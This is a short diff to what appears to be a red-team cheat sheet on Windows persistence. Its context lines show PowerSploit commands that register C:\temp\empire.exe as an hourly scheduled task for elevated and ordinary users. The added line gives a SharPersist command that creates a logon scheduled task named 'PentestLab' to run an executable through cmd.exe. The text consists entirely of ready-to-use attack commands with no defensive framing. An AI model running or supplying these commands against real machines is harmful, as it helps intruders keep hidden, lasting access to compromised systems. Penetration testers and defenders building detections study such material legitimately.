@@ -24,3 +24,6 @@ powersploit:
 $ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -Hourly
 $UserOptions = New-UserPersistenceOption -ScheduledTask -Hourly
 Add-Persistence -FilePath C:\temp\empire.exe -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions
+
+sharpersist.exe :
+SharPersist.exe -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c C:\tmp\pentestlab.exe" -n "PentestLab" -m add -o logon
